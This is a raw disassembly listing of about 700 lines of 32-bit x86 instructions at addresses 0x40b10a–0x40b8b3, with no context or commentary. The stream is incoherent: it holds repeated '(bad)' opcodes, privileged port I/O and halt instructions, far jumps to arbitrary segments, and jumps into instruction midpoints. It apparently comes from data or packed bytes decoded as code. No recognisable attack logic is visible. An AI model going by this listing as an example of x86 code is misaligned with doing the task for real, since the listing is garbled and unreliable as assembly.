  40b10a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b10b:	aaa    
  40b10c:	xchg   ecx,eax
  40b10d:	(bad)
  40b110:	lahf   
  40b111:	lods   al,BYTE PTR ds:[esi]
  40b112:	addr16 sub edi,edi
  40b115:	mov    BYTE PTR [ecx],dl
  40b117:	push   ebx
  40b118:	adc    DWORD PTR [esp+ebp*4+0x1704f573],eax
  40b11f:	xor    al,0xb0
  40b121:	xor    eax,0x447fecb9
  40b126:	loop   0x40b137
  40b128:	cmp    eax,DWORD PTR [ebx-0x33]
  40b12b:	js     0x40b0ba
  40b12d:	jno    0xe43fd90f
  40b133:	repz cs mov ebx,0xf5a80b99
  40b13a:	push   ebx
  40b13b:	lods   al,BYTE PTR ds:[esi]
  40b13c:	shr    BYTE PTR [esi+0x740d4184],cl
  40b142:	out    dx,eax
  40b143:	sub    eax,0xb84cbaa7
  40b148:	dec    ecx
  40b149:	jae    0x40b174
  40b14b:	add    ebx,DWORD PTR [edi+0x2bf05215]
  40b151:	in     al,0x34
  40b153:	and    al,0x5f
  40b155:	dec    edx
  40b156:	(bad)  
  40b157:	push   ebx
  40b158:	xchg   ebp,eax
  40b159:	xchg   ecx,eax
  40b15a:	push   ebp
  40b15b:	add    eax,0x6b897d86
  40b160:	pop    ebx
  40b161:	into   
  40b162:	ds sub al,0x6b
  40b165:	xchg   ebp,eax
  40b166:	push   ebx
  40b167:	jo     0x40b1b4
  40b169:	sbb    BYTE PTR [ebx+ecx*8],al
  40b16c:	xchg   esi,eax
  40b16d:	gs out dx,al
  40b16f:	dec    ebx
  40b170:	lea    edi,[ebx+0x31]
  40b173:	imul   esp,DWORD PTR [edx-0x74],0x17e098e2
  40b17a:	push   ecx
  40b17b:	mov    ah,0x5a
  40b17d:	pushf  
  40b17e:	(bad)  
  40b17f:	mov    ds:0xc8850f30,eax
  40b184:	mov    dh,0xf1
  40b186:	daa    
  40b187:	arpl   WORD PTR [ebx+0x3d42a484],ax
  40b18d:	mov    cl,0x17
  40b18f:	cdq    
  40b190:	add    eax,0x8d0d1bdd
  40b195:	jb     0x40b11c
  40b197:	in     al,0xfa
  40b199:	pushf  
  40b19a:	ins    BYTE PTR es:[edi],dx
  40b19b:	sbb    dl,bh
  40b19d:	jl     0x40b183
  40b19f:	sar    DWORD PTR [edx],1
  40b1a1:	sbb    al,0x12
  40b1a3:	stos   DWORD PTR es:[edi],eax
  40b1a4:	jl     0x40b19f
  40b1a6:	mov    cl,0xc9
  40b1a8:	sub    ah,BYTE PTR [esi]
  40b1aa:	and    DWORD PTR [ebp+0x4f],esp
  40b1ad:	cdq    
  40b1ae:	es pop ebp
  40b1b0:	(bad)  
  40b1b2:	sbb    al,0x79
  40b1b4:	ss pop ds
  40b1b6:	(bad)  
  40b1b7:	xor    ebp,DWORD PTR [eax+0x7572b42b]
  40b1bd:	or     BYTE PTR [eax+0x78],ah
  40b1c0:	and    ah,BYTE PTR [edx-0x7836512f]
  40b1c6:	inc    esi
  40b1c7:	imul   edx,DWORD PTR [ecx+0x3a253734],0x62
  40b1ce:	imul   edx,DWORD PTR ss:[eax-0x2e],0x1c8eb8e
  40b1d6:	sar    DWORD PTR [eax-0x3a],cl
  40b1d9:	mov    cl,0x46
  40b1db:	lock xchg BYTE PTR [edi+0x64],dh
  40b1df:	mov    ds:0xe491165b,al
  40b1e4:	mov    bh,0x1c
  40b1e6:	adc    cl,ch
  40b1e8:	sti    
  40b1e9:	test   eax,0xbda2ba9
  40b1ee:	cmp    eax,ebp
  40b1f0:	dec    eax
  40b1f1:	and    eax,DWORD PTR [esi]
  40b1f3:	mov    ebp,0x144547cb
  40b1f8:	jb     0x40b1e8
  40b1fa:	dec    ecx
  40b1fb:	pop    ebp
  40b1fc:	cmp    BYTE PTR [ebx-0x50a30463],0xab
  40b203:	add    ah,BYTE PTR [ebp-0x58]
  40b206:	ret    
  40b207:	loopne 0x40b255
  40b209:	cmp    ah,al
  40b20b:	mov    ebx,DWORD PTR [ebx+0x6]
  40b20e:	jmp    0x40b1ba
  40b210:	out    dx,al
  40b211:	pop    es
  40b212:	xchg   ebx,eax
  40b213:	jmp    0x5740:0xac7c7c6b
  40b21a:	and    DWORD PTR [eax+0x32],esi
  40b21d:	loop   0x40b1db
  40b21f:	mov    ah,0x71
  40b221:	mov    al,ds:0x429ce035
  40b226:	jmp    0x40b1b5
  40b228:	std    
  40b229:	scas   al,BYTE PTR es:[edi]
  40b22a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b22b:	test   DWORD PTR [ebx-0x3f],0xa72a2954
  40b232:	iret   
  40b233:	pop    es
  40b234:	or     ch,BYTE PTR [edx+0x61fc2173]
  40b23a:	push   esi
  40b23b:	xor    bh,BYTE PTR [ebx-0x73]
  40b23e:	mov    cl,0x61
  40b240:	push   0xffffffdb
  40b242:	jge    0x40b22a
  40b244:	jb     0x40b264
  40b246:	xchg   ebx,eax
  40b247:	add    edx,DWORD PTR [edx]
  40b249:	test   BYTE PTR [esi-0x59b9066a],0x2
  40b250:	fwait
  40b251:	pop    esp
  40b252:	xlat   BYTE PTR ds:[ebx]
  40b253:	xor    BYTE PTR [edi-0x1c],ch
  40b256:	std    
  40b257:	cwde   
  40b258:	stos   BYTE PTR es:[edi],al
  40b259:	cli    
  40b25a:	mov    dh,0xd8
  40b25c:	adc    eax,0x231e6359
  40b261:	mov    WORD PTR [esp+ecx*1-0x699d83f4],ds
  40b268:	cmp    ebx,DWORD PTR [eax]
  40b26a:	lock adc eax,0x5190edb2
  40b270:	mov    ah,BYTE PTR ss:[esi-0x5a]
  40b274:	fs sbb ah,bh
  40b277:	jno    0x40b246
  40b279:	leave  
  40b27a:	ficom  WORD PTR [eax+0x5b]
  40b27d:	pushf  
  40b27e:	cwde   
  40b27f:	ror    DWORD PTR [edx*2-0x5fe1bb9c],cl
  40b286:	cld    
  40b287:	lahf   
  40b288:	xchg   esi,eax
  40b289:	js     0x40b299
  40b28b:	mov    ebx,eax
  40b28d:	sub    BYTE PTR [eax-0x7d631e85],0x10
  40b294:	push   esp
  40b295:	sbb    DWORD PTR [ebx-0x6adad8c9],edx
  40b29b:	jp     0x40b277
  40b29d:	mov    bl,0x3d
  40b29f:	sbb    esp,DWORD PTR [esi+0x29a8556f]
  40b2a5:	shl    BYTE PTR [edi-0x2695c765],0xfd
  40b2ac:	sti    
  40b2ad:	or     eax,0xad39171a
  40b2b2:	cld    
  40b2b3:	mov    dl,BYTE PTR [ecx]
  40b2b5:	enter  0xd0c0,0x7a
  40b2b9:	jno    0x40b274
  40b2bb:	and    DWORD PTR [edi+0x3c],ebp
  40b2be:	cmc    
  40b2bf:	add    eax,0xbb124364
  40b2c4:	(bad)  
  40b2c5:	jecxz  0x40b29c
  40b2c7:	fidiv  WORD PTR [ebx-0x5f]
  40b2ca:	or     eax,0x444da0e1
  40b2cf:	aad    0x5b
  40b2d1:	sub    eax,0x85425d87
  40b2d6:	cmp    esi,DWORD PTR [edi+0x453e0aa5]
  40b2dc:	xchg   ebp,eax
  40b2dd:	adc    eax,0x4c8a9910
  40b2e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e3:	cld    
  40b2e4:	cld    
  40b2e5:	daa    
  40b2e6:	mov    esp,0xddc7a1c0
  40b2eb:	mov    al,0xde
  40b2ed:	je     0x40b2e4
  40b2ef:	imul   BYTE PTR [eax]
  40b2f1:	fcom   DWORD PTR [esi+0x71]
  40b2f4:	test   dl,0x19
  40b2f7:	aaa    
  40b2f8:	xor    eax,0xeb29e7c
  40b2fd:	mov    cl,0x1
  40b2ff:	sub    ch,bh
  40b301:	cmp    ebp,edx
  40b303:	fisttp QWORD PTR [ebp+0x24]
  40b306:	lds    sp,DWORD PTR ds:0xa74ecf91
  40b30d:	lds    ebx,FWORD PTR [edi]
  40b30f:	xchg   edx,eax
  40b310:	mov    edx,0x4bda59d9
  40b315:	inc    esp
  40b316:	xlat   BYTE PTR ds:[ebx]
  40b317:	mov    WORD PTR [edx],cs
  40b319:	pop    ss
  40b31a:	out    dx,eax
  40b31b:	aam    0x2c
  40b31d:	es dec ecx
  40b31f:	out    0xce,al
  40b321:	mov    edi,0xec336515
  40b326:	and    ecx,DWORD PTR [edi-0x50]
  40b329:	add    BYTE PTR [ebx+0x35],dh
  40b32c:	or     BYTE PTR [edx-0x3eb4cfda],ch
  40b332:	enter  0x3c03,0x6e
  40b336:	add    DWORD PTR [edi+0x29],edx
  40b339:	rcl    DWORD PTR [esi],0xff
  40b33c:	jmp    0xa2a6:0xa569211d
  40b343:	sub    BYTE PTR [edi],ah
  40b345:	adc    bl,BYTE PTR [edx-0x7b6a3b60]
  40b34b:	sti    
  40b34c:	pop    ebp
  40b34d:	add    al,0x27
  40b34f:	cmp    al,0xb0
  40b351:	jmp    0x40b300
  40b353:	out    dx,al
  40b354:	repz test al,0x2f
  40b357:	push   ebp
  40b358:	inc    ebx
  40b359:	push   0xffffff92
  40b35b:	mov    esi,0x19fd0a24
  40b360:	fist   DWORD PTR [ebx+0x2d4d9165]
  40b366:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b367:	adc    DWORD PTR [ecx],eax
  40b369:	inc    esp
  40b36a:	out    0x52,eax
  40b36c:	push   es
  40b36d:	shl    DWORD PTR [eax+0x2b],cl
  40b370:	scas   eax,DWORD PTR es:[edi]
  40b371:	aas    
  40b372:	fcmovu st,st(7)
  40b374:	jmp    0x7a00:0xe402248d
  40b37b:	cld    
  40b37c:	jae    0x40b331
  40b37e:	xor    eax,0x1b95c5cb
  40b383:	loopne 0x40b3e2
  40b385:	and    ch,BYTE PTR [esi]
  40b387:	mov    eax,ds:0x7945d2ef
  40b38c:	xchg   DWORD PTR [edi-0x5a04b236],ebx
  40b392:	mov    ds:0xbd775f6c,eax
  40b397:	mov    ds:0x73faebd1,eax
  40b39c:	test   eax,0xfa8020b6
  40b3a1:	add    eax,DWORD PTR [edi+edi*2-0x491a140c]
  40b3a8:	cs in  al,0x47
  40b3ab:	pusha  
  40b3ac:	fsubr  st,st(6)
  40b3ae:	or     DWORD PTR [edi+0x5c],0xf
  40b3b2:	jne    0x40b3fc
  40b3b4:	sbb    eax,0x530e61f7
  40b3b9:	outs   dx,BYTE PTR ds:[esi]
  40b3ba:	xor    eax,0x21d839ae
  40b3bf:	mov    DWORD PTR [eax],0xfa388b6a
  40b3c5:	ret    0x4650
  40b3c8:	push   ss
  40b3c9:	sti    
  40b3ca:	call   0x7943:0xb4d9c483
  40b3d1:	iret   
  40b3d2:	mov    ebx,0xb6df505a
  40b3d7:	xchg   edx,eax
  40b3d8:	scas   eax,DWORD PTR es:[edi]
  40b3d9:	ja     0x40b400
  40b3db:	mov    BYTE PTR [ebx],cl
  40b3dd:	xor    ebx,ecx
  40b3df:	loopne 0x40b3c9
  40b3e1:	xchg   esi,eax
  40b3e2:	and    dh,al
  40b3e4:	mul    BYTE PTR [ebx]
  40b3e6:	sbb    al,0x18
  40b3e8:	ja     0x40b396
  40b3ea:	sub    esp,edi
  40b3ec:	shl    DWORD PTR [eax],0xcb
  40b3ef:	xchg   ebx,eax
  40b3f0:	jge    0x40b3d2
  40b3f2:	sbb    al,0x46
  40b3f4:	ins    BYTE PTR es:[edi],dx
  40b3f5:	je     0x40b476
  40b3f7:	fld    QWORD PTR [ebx+0x2a]
  40b3fa:	rol    eax,1
  40b3fc:	shl    edx,cl
  40b3fe:	test   BYTE PTR [esi-0x71],0x93
  40b402:	and    ebp,DWORD PTR [ebx]
  40b404:	dec    eax
  40b405:	dec    esp
  40b406:	bnd jns 0x40b3a9
  40b409:	adc    eax,0x14957b37
  40b40e:	les    edi,FWORD PTR [edx+edx*2]
  40b411:	and    BYTE PTR [edx-0x5df8a4f8],ah
  40b417:	mov    ah,0x1b
  40b419:	sub    BYTE PTR [eax],cl
  40b41b:	stos   BYTE PTR es:[edi],al
  40b41c:	sbb    dl,BYTE PTR [eax+eiz*8+0x1f2b9945]
  40b423:	leave  
  40b424:	mov    ?,WORD PTR [ebp+0x5b]
  40b427:	leave  
  40b428:	mov    al,0xe2
  40b42a:	retf   
  40b42b:	xor    ch,BYTE PTR [eax+0x26]
  40b42e:	test   eax,0xb3f62c6b
  40b433:	cld    
  40b434:	xor    ch,BYTE PTR [esi]
  40b436:	mov    ebx,0x25be565f
  40b43b:	loopne 0x40b453
  40b43d:	jge    0x40b420
  40b43f:	xor    edi,ebx
  40b441:	mov    esp,0x89195ce
  40b446:	push   es
  40b447:	jge    0x40b41e
  40b449:	adc    BYTE PTR [esi],bl
  40b44b:	scas   al,BYTE PTR es:[edi]
  40b44c:	add    eax,0x41270eb1
  40b451:	fldcw  WORD PTR [edi+edx*2]
  40b454:	repnz loopne 0x40b49d
  40b457:	sbb    ebx,DWORD PTR [ebx]
  40b459:	and    ah,ah
  40b45b:	xchg   esp,eax
  40b45c:	pusha  
  40b45d:	adc    ecx,DWORD PTR [ecx]
  40b45f:	jp     0x40b426
  40b461:	mov    BYTE PTR [ecx],0xcc
  40b464:	add    DWORD PTR [eax-0x6f9e723c],ebx
  40b46a:	data16 jbe 0x40b421
  40b46d:	stos   DWORD PTR es:[edi],eax
  40b46e:	cwde   
  40b46f:	push   eax
  40b470:	mov    eax,ds:0xe4497e5
  40b475:	mov    edi,0xa6dfac9b
  40b47a:	jnp    0x40b4d5
  40b47c:	cmp    BYTE PTR [edx*8-0x696f895c],dl
  40b483:	pop    ds
  40b484:	test   BYTE PTR [eax+0x30],ah
  40b487:	daa    
  40b488:	mov    bh,0x30
  40b48a:	popa   
  40b48b:	jno    0x40b495
  40b48d:	lahf   
  40b48e:	pop    edi
  40b48f:	dec    BYTE PTR [edx-0x54f98aed]
  40b495:	fnstcw WORD PTR [edx+0x20]
  40b498:	dec    eax
  40b499:	jne    0x40b4c4
  40b49b:	mov    cl,0x6b
  40b49d:	sbb    bh,BYTE PTR [ebx-0x69]
  40b4a0:	mov    WORD PTR [ebx],ss
  40b4a2:	adc    bl,0x7e
  40b4a5:	imul   eax,eax,0x4607117c
  40b4ab:	cmp    ah,BYTE PTR [ecx*1+0x801593d]
  40b4b2:	scas   eax,DWORD PTR es:[edi]
  40b4b3:	mov    edx,DWORD PTR [ebx]
  40b4b5:	aas    
  40b4b6:	aam    0xda
  40b4b8:	push   edi
  40b4b9:	push   ss
  40b4ba:	xchg   DWORD PTR [edx],ecx
  40b4bc:	ror    BYTE PTR [esi+ebp*2-0x601a8f9c],0x75
  40b4c4:	xchg   ecx,eax
  40b4c5:	pop    ds
  40b4c6:	mov    ebp,0xd9e816b2
  40b4cb:	xor    DWORD PTR [edi],edx
  40b4cd:	lds    ebx,FWORD PTR [ebx-0x50]
  40b4d0:	gs cmp eax,0xd3c827dd
  40b4d6:	pop    edx
  40b4d7:	in     al,0x3c
  40b4d9:	stos   BYTE PTR es:[edi],al
  40b4da:	or     eax,0x70c40c63
  40b4df:	imul   ebp,DWORD PTR [ecx],0xffffffb9
  40b4e2:	mov    edi,0x273bb327
  40b4e7:	pop    ss
  40b4e8:	sbb    al,0x86
  40b4ea:	out    dx,eax
  40b4eb:	fucomp st(1)
  40b4ed:	mov    edx,0x18b3ddf5
  40b4f2:	pop    esp
  40b4f3:	pop    ecx
  40b4f4:	and    bl,cl
  40b4f6:	inc    ebx
  40b4f7:	and    cl,BYTE PTR [edi-0x45]
  40b4fa:	mov    al,ds:0x5a053317
  40b4ff:	mov    BYTE PTR [ebx+0x562245ec],cl
  40b505:	xor    ecx,esi
  40b507:	int3   
  40b508:	fisub  WORD PTR [ebx+esi*2]
  40b50b:	push   eax
  40b50c:	or     al,0x9e
  40b50e:	push   ecx
  40b50f:	push   ss
  40b510:	mov    al,ds:0x5b5bfdbd
  40b515:	int3   
  40b516:	and    al,0xfb
  40b518:	test   DWORD PTR [edi-0x76],eax
  40b51b:	mov    WORD PTR [eax-0x390e36d3],ds
  40b521:	ficom  DWORD PTR [edi+0x3]
  40b524:	dec    edi
  40b525:	mov    ecx,0x3398a46d
  40b52a:	dec    ebp
  40b52b:	sbb    DWORD PTR [esp+edx*4],edx
  40b52e:	sub    ch,ah
  40b530:	(bad)  [ecx+0x200dd2a4]
  40b536:	and    ebp,DWORD PTR [esp+esi*4-0x5f]
  40b53a:	jmp    0x7f66bb23
  40b53f:	jbe    0x40b59a
  40b541:	cmp    BYTE PTR [ecx+0x49],ch
  40b544:	jge    0x40b546
  40b546:	and    al,0x8a
  40b548:	jbe    0x40b5ae
  40b54a:	mov    ebx,0xff07a5b1
  40b54f:	arpl   WORD PTR [edi],di
  40b551:	and    al,0xc4
  40b553:	mov    cs,esp
  40b555:	retf   
  40b556:	mov    dh,0x57
  40b558:	sahf   
  40b559:	and    ebx,DWORD PTR [edi]
  40b55b:	(bad)  
  40b55d:	pop    ss
  40b55e:	enter  0x5c7a,0x7
  40b562:	test   ah,0xd
  40b565:	mov    cl,0x16
  40b567:	mov    ch,0x96
  40b569:	outs   dx,DWORD PTR ds:[esi]
  40b56a:	push   ss
  40b56b:	hlt    
  40b56c:	outs   dx,DWORD PTR ds:[esi]
  40b56d:	xchg   esp,eax
  40b56e:	xor    ch,BYTE PTR gs:[edx-0x6d2a96ce]
  40b575:	rcl    BYTE PTR [eax+0xf],1
  40b578:	or     BYTE PTR [eax+ecx*4+0xc],ch
  40b57c:	js     0x40b557
  40b57e:	mov    ebx,DWORD PTR [ebx-0xb]
  40b581:	lock std 
  40b583:	and    al,0x7
  40b585:	jg     0x40b600
  40b587:	or     BYTE PTR [edx-0x6738f5cc],ah
  40b58d:	pop    DWORD PTR [eax]
  40b58f:	add    BYTE PTR [edx],al
  40b591:	add    bh,dl
  40b593:	pusha  
  40b594:	cmp    DWORD PTR [eax-0x10],edx
  40b597:	stos   BYTE PTR es:[edi],al
  40b598:	pop    eax
  40b599:	xor    DWORD PTR [eax*1-0x79871e27],edx
  40b5a0:	or     eax,0x83e7c173
  40b5a5:	outs   dx,BYTE PTR ds:[esi]
  40b5a6:	es hlt 
  40b5a8:	push   ds
  40b5a9:	push   es
  40b5aa:	pusha  
  40b5ab:	pusha  
  40b5ac:	push   esp
  40b5ad:	adc    BYTE PTR ds:0x98697f7,ah
  40b5b3:	stc    
  40b5b4:	add    ecx,DWORD PTR [ecx+0x17c3fc2a]
  40b5ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5bb:	mov    ds:0x20879fa4,eax
  40b5c0:	mov    al,0x53
  40b5c2:	adc    al,0xe8
  40b5c4:	sbb    eax,0x90503eb4
  40b5c9:	(bad)  
  40b5ca:	sub    BYTE PTR [edx],bh
  40b5cc:	les    ebx,FWORD PTR [ecx-0x33]
  40b5cf:	or     bl,0x51
  40b5d2:	jae    0x40b60d
  40b5d4:	bound  ebx,QWORD PTR [esp+eax*2+0x11]
  40b5d8:	push   0x9d94553a
  40b5dd:	dec    esi
  40b5de:	push   esi
  40b5df:	test   al,0x4e
  40b5e1:	xor    BYTE PTR [ecx-0x60],0x6d
  40b5e5:	dec    esp
  40b5e6:	mov    ecx,0xbc4928fc
  40b5eb:	into   
  40b5ec:	jg     0x40b58b
  40b5ee:	xor    eax,0x9148a684
  40b5f3:	shl    BYTE PTR [ecx],cl
  40b5f5:	xlat   BYTE PTR ds:[ebx]
  40b5f6:	ds leave 
  40b5f8:	xor    bl,BYTE PTR [ebx+0x3a732ba3]
  40b5fe:	push   0xffffff86
  40b600:	xchg   edi,eax
  40b601:	test   DWORD PTR [esi],ebp
  40b603:	mov    ebp,0x7e6628a3
  40b608:	sbb    esi,DWORD PTR [eax+0x3d]
  40b60b:	outs   dx,DWORD PTR gs:[esi]
  40b60d:	int    0x87
  40b60f:	sbb    dh,BYTE PTR [ecx-0x46822d57]
  40b615:	sbb    BYTE PTR [edi+0x1928a07d],dh
  40b61b:	ret    0xf067
  40b61e:	std    
  40b61f:	sbb    BYTE PTR [edi],dl
  40b621:	sti    
  40b622:	rcl    dl,0x1c
  40b625:	cld    
  40b626:	fcmovu st,st(7)
  40b628:	xor    dl,BYTE PTR [esi]
  40b62a:	xor    BYTE PTR [ebx+0x21],dh
  40b62d:	es stc 
  40b62f:	xchg   BYTE PTR [ebp+edi*1+0x392e9764],al
  40b636:	lods   eax,DWORD PTR ds:[esi]
  40b637:	push   cs
  40b638:	add    al,0xbc
  40b63a:	mov    es,WORD PTR [ebx-0xa]
  40b63d:	and    BYTE PTR [ecx-0x739dc662],bl
  40b643:	enter  0xbda4,0xfa
  40b647:	mov    eax,0x54c269d2
  40b64c:	inc    esp
  40b64d:	xchg   ebx,eax
  40b64e:	adc    ebp,DWORD PTR [ecx-0x25]
  40b651:	or     ebp,DWORD PTR [ecx]
  40b653:	mov    cs,edi
  40b655:	xor    al,0x81
  40b657:	push   ss
  40b658:	in     al,dx
  40b659:	std    
  40b65a:	adc    DWORD PTR [edi],eax
  40b65c:	call   0x1806:0x8618540b
  40b663:	outs   dx,DWORD PTR ds:[esi]
  40b664:	jecxz  0x40b6b7
  40b666:	nop
  40b667:	fbstp  TBYTE PTR [eax-0x22]
  40b66a:	loopne 0x40b61d
  40b66c:	ins    BYTE PTR es:[edi],dx
  40b66d:	xor    eax,0x337b8aa
  40b672:	div    al
  40b674:	sub    DWORD PTR [ebx-0x23e2f022],edi
  40b67a:	dec    ebp
  40b67b:	push   esp
  40b67c:	push   ebx
  40b67d:	cmp    al,0x67
  40b67f:	cmp    ebp,DWORD PTR [esi-0x2f470772]
  40b685:	cmp    esp,DWORD PTR ds:0x722ac6df
  40b68b:	test   edi,ebx
  40b68d:	xor    eax,0xea003549
  40b692:	popf   
  40b693:	mov    eax,ds:0x39220692
  40b698:	mov    ebp,0x8c9f6f74
  40b69d:	jge    0x40b69f
  40b69f:	xor    DWORD PTR [esi],edx
  40b6a1:	in     eax,dx
  40b6a2:	stos   BYTE PTR es:[edi],al
  40b6a3:	mov    dh,0x34
  40b6a5:	inc    esi
  40b6a6:	fidiv  DWORD PTR [edx]
  40b6a8:	push   ebp
  40b6a9:	leave  
  40b6aa:	mov    WORD PTR [ebx+esi*2+0x49],ss
  40b6ae:	adc    DWORD PTR [ebp-0x71],0xd47657aa
  40b6b5:	call   0xc646:0xe114fb57
  40b6bc:	icebp  
  40b6bd:	ficom  DWORD PTR [esi]
  40b6bf:	das    
  40b6c0:	dec    eax
  40b6c1:	or     BYTE PTR [ebx+0x54848d79],al
  40b6c7:	add    BYTE PTR [edi+0x2660fdcc],cl
  40b6cd:	sub    al,0x38
  40b6cf:	push   es
  40b6d0:	arpl   WORD PTR [esi],ax
  40b6d2:	in     eax,0xf9
  40b6d4:	in     al,0x1c
  40b6d6:	jle    0xeaae6f6e
  40b6dc:	out    dx,eax
  40b6dd:	mov    esi,0x651fa37
  40b6e2:	jmp    0x7c7128ce
  40b6e7:	mov    BYTE PTR [edi+0xc],bl
  40b6ea:	push   edx
  40b6eb:	mov    ebx,edx
  40b6ed:	jmp    ebp
  40b6ef:	and    al,0x83
  40b6f1:	stos   DWORD PTR es:[edi],eax
  40b6f2:	xchg   ebx,eax
  40b6f3:	test   al,0x54
  40b6f5:	jmp    0x40b70c
  40b6f7:	dec    ebx
  40b6f8:	push   es
  40b6f9:	sbb    eax,0xf4d37196
  40b6fe:	adc    esi,0xeea3ff1
  40b704:	jno    0x40b75f
  40b706:	pop    ecx
  40b707:	fcmovbe st,st(0)
  40b709:	and    al,0x1b
  40b70b:	pushf  
  40b70c:	mov    ebx,0xecf516aa
  40b711:	push   eax
  40b712:	inc    eax
  40b713:	inc    esi
  40b714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b715:	and    al,0xde
  40b717:	test   al,0x3
  40b719:	mov    ch,0x2
  40b71b:	fadd   QWORD PTR [ebx+0x6d]
  40b71e:	xor    eax,0xdbbfb66a
  40b723:	xor    al,0x74
  40b725:	ins    DWORD PTR es:[edi],dx
  40b726:	inc    eax
  40b727:	neg    BYTE PTR [ebx]
  40b729:	in     eax,0xb3
  40b72b:	retf   0xf326
  40b72e:	iret   
  40b72f:	cdq    
  40b730:	lock arpl WORD PTR [esi],di
  40b733:	jno    0x40b6b5
  40b735:	xor    cl,0xc4
  40b738:	fild   QWORD PTR ds:0xe73f
  40b73d:	jle    0x40b7a4
  40b73f:	cmp    edx,DWORD PTR [eax+eiz*8+0x76566ba7]
  40b746:	mov    eax,0x2fd392c6
  40b74b:	fs pop es
  40b74d:	xchg   esp,eax
  40b74e:	push   ebx
  40b74f:	xor    BYTE PTR [eax],0xa7
  40b752:	adc    BYTE PTR [eax-0x487db20a],dl
  40b758:	in     eax,dx
  40b759:	ja     0x40b74f
  40b75b:	xchg   edi,eax
  40b75c:	stos   DWORD PTR es:[edi],eax
  40b75d:	cmp    eax,0x13103f77
  40b762:	push   esp
  40b763:	push   ebx
  40b764:	jmp    0x40b70b
  40b766:	mov    bh,al
  40b768:	not    BYTE PTR [edi+0x5f117ca3]
  40b76e:	(bad)  
  40b76f:	pop    ds
  40b770:	sbb    BYTE PTR [edi],bl
  40b772:	loope  0x40b771
  40b774:	bound  edx,QWORD PTR [edx-0xd13aaf]
  40b77a:	call   0xef0c2806
  40b77f:	jne    0x40b739
  40b781:	jl     0x40b7cc
  40b783:	mov    eax,0xd51b3901
  40b788:	mov    ecx,0x528866b3
  40b78d:	mov    eax,0x49266823
  40b792:	adc    eax,0x8b8599ec
  40b797:	aaa    
  40b798:	ds retf 0xbda0
  40b79c:	emms   
  40b79e:	cmp    DWORD PTR [edi-0x24],edx
  40b7a1:	repnz stc 
  40b7a3:	retf   
  40b7a4:	repnz into 
  40b7a6:	in     eax,0x51
  40b7a8:	or     eax,0xe821460c
  40b7ad:	jp     0x40b807
  40b7af:	(bad)  
  40b7b0:	dec    esp
  40b7b1:	ret    
  40b7b2:	inc    ecx
  40b7b3:	or     dh,BYTE PTR [esp+eiz*4]
  40b7b6:	sbb    ch,ah
  40b7b8:	cli    
  40b7b9:	add    eax,0x88534e5f
  40b7be:	loopne 0x40b7e5
  40b7c0:	div    BYTE PTR [ebx+0x2d]
  40b7c3:	push   ebx
  40b7c4:	jmp    0xaa9be1ad
  40b7c9:	mov    bl,0x60
  40b7cb:	(bad)  
  40b7cc:	or     al,0x4c
  40b7ce:	mov    eax,0x765d9075
  40b7d3:	(bad)  
  40b7d4:	retf   0xf86a
  40b7d7:	xor    eax,0xf8cee103
  40b7dc:	sbb    BYTE PTR [esi+0x3e516da2],ah
  40b7e2:	xor    bl,BYTE PTR [edx+0x56]
  40b7e5:	pop    edi
  40b7e6:	mov    edx,0x17e9424c
  40b7eb:	ss pop ds
  40b7ed:	leave  
  40b7ee:	mov    al,ds:0xcc81c371
  40b7f3:	mov    al,ds:0x97f2560f
  40b7f8:	push   edx
  40b7f9:	arpl   cx,bp
  40b7fb:	(bad)  
  40b7fc:	repnz dec ebx
  40b7fe:	lea    ecx,[ebx-0x48]
  40b801:	mov    esp,0x3f4e3457
  40b806:	xor    DWORD PTR [ecx+0x16],0xcee59d62
  40b80d:	enter  0xf1b,0xbb
  40b811:	inc    eax
  40b812:	dec    ebx
  40b813:	sahf   
  40b814:	lea    edi,[ecx-0x381d15f7]
  40b81a:	aas    
  40b81b:	add    al,0x37
  40b81d:	mov    esp,DWORD PTR [eax+0x77192ba3]
  40b823:	pusha  
  40b824:	lods   eax,DWORD PTR ds:[esi]
  40b825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b826:	les    edi,FWORD PTR [edx+0x364fe3f4]
  40b82c:	and    BYTE PTR [esi+0x3d],0xf5
  40b830:	xor    eax,0xb529d9c2
  40b835:	test   eax,0x9a65470
  40b83a:	(bad)  
  40b83b:	neg    DWORD PTR [edi+0xe]
  40b83e:	(bad)  
  40b83f:	jp     0x40b845
  40b841:	aad    0xd6
  40b843:	pop    edi
  40b844:	adc    DWORD PTR [eiz*2-0x4d4c74f0],ebx
  40b84b:	cdq    
  40b84c:	jns    0x40b822
  40b84e:	push   ebp
  40b84f:	pusha  
  40b850:	pusha  
  40b851:	icebp  
  40b852:	bound  ebx,QWORD PTR [edx-0x83d7ab7]
  40b858:	loop   0x40b86e
  40b85a:	mov    edi,0xc73f9309
  40b85f:	push   ebp
  40b860:	bound  esp,QWORD PTR [edi]
  40b862:	pop    ebp
  40b863:	loop   0x40b847
  40b865:	out    dx,eax
  40b866:	les    edi,FWORD PTR [ebx+0x15b4770d]
  40b86c:	dec    edi
  40b86d:	jb     0x40b805
  40b86f:	pop    ebp
  40b870:	dec    ebx
  40b871:	lods   eax,DWORD PTR ds:[esi]
  40b872:	in     eax,dx
  40b873:	cmc    
  40b874:	xor    DWORD PTR [ebp-0x12d2f98d],eax
  40b87a:	retf   
  40b87b:	mov    eax,0x16f2e56c
  40b880:	mov    bl,BYTE PTR [edx+0x33a8dd3a]
  40b886:	outs   dx,BYTE PTR ds:[esi]
  40b887:	hlt    
  40b888:	fdivr  DWORD PTR [esi+0x14]
  40b88b:	icebp  
  40b88c:	into   
  40b88d:	sbb    al,0x5e
  40b88f:	ins    BYTE PTR es:[edi],dx
  40b890:	cmp    dl,BYTE PTR [edx]
  40b892:	fxch   st(4)
  40b894:	icebp  
  40b895:	xor    eax,0x717d7b07
  40b89a:	loop   0x40b83f
  40b89c:	cli    
  40b89d:	mov    edx,0x428c4042
  40b8a2:	xor    al,0x25
  40b8a4:	xchg   edx,esi
  40b8a6:	pusha  
  40b8a7:	sbb    BYTE PTR [edx],ah
  40b8a9:	lahf   
  40b8aa:	sub    edx,ecx
  40b8ac:	call   0x1e5dee0d
  40b8b1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40b8b3:	inc    esi
